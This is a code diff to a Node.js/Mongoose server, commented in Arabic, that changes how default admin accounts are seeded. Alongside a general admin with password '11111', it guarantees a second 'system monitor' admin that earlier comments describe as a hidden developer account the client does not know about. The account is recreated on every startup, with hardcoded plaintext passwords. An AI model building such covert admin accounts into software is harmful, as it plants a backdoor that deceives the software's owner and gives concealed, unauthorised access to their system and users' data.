@@ -111,34 +111,35 @@ const Article = mongoose.model('Article', articleSchema);
 // =======================
 async function createDefaultAdminIfNeeded() {
     try {
-        const adminExists = await User.findOne({ role: 'admin' });
-        // --- تعديل: سنقوم بإنشاء الحسابات الافتراضية فقط إذا لم يكن هناك أي مدير على الإطلاق ---
-        if (!adminExists) {
-            // حساب المدير العام (للعميل)
+        // --- التصحيح: التحقق من وجود كل حساب مدير على حدة ---
+
+        // 1. التحقق من وجود المدير العام
+        const generalAdminExists = await User.findOne({ id: '11111' });
+        if (!generalAdminExists) {
             const defaultAdmin = new User({
                 id: '11111',
                 name: 'المدير العام',
-                password: '11111', // كلمة مرور بسيطة، يجب تغييرها
+                password: '11111',
                 role: 'admin'
             });
+            await defaultAdmin.save();
+            console.log('✅ تم إنشاء حساب المدير العام الافتراضي.');
+        }
 
-            // حساب مراقب النظام (للمطور) - حساب خفي
+        // 2. التحقق من وجود مراقب النظام (المدير الخفي)
+        const monitorAdminExists = await User.findOne({ id: '12121212' });
+        if (!monitorAdminExists) {
             const devMonitorAdmin = new User({
-                id: '12121212', // رقم عضوية رقمي وخاص بك لا يعرفه العميل
+                id: '12121212',
                 name: 'مراقب النظام',
-                password: '987654321', // كلمة المرور الحقيقية التي ستستخدم في الخطوة الثانية
+                password: '987654321',
                 role: 'admin'
             });
-
-            await User.insertMany([defaultAdmin, devMonitorAdmin]);
-            console.log('✅ تم إنشاء حسابات المدير الافتراضية (المدير العام والمراقب) بنجاح.');
+            await devMonitorAdmin.save();
+            console.log('✅ تم إنشاء حساب مراقب النظام الخفي.');
         }
     } catch (error) {
-        // قد يحدث خطأ إذا كانت الحسابات موجودة بالفعل، وهذا طبيعي.
-        if (error.code === 11000) {
-            console.log('ℹ️ الحسابات الإدارية الافتراضية موجودة بالفعل.');
-        }
-        console.error('❌ فشل في إنشاء حساب المدير الافتراضي:', error); // التصحيح: إزالة return للسماح للخادم بالاستمرار
+        console.error('❌ فشل في إنشاء حسابات المدراء الافتراضية:', error);
     }
 }
 
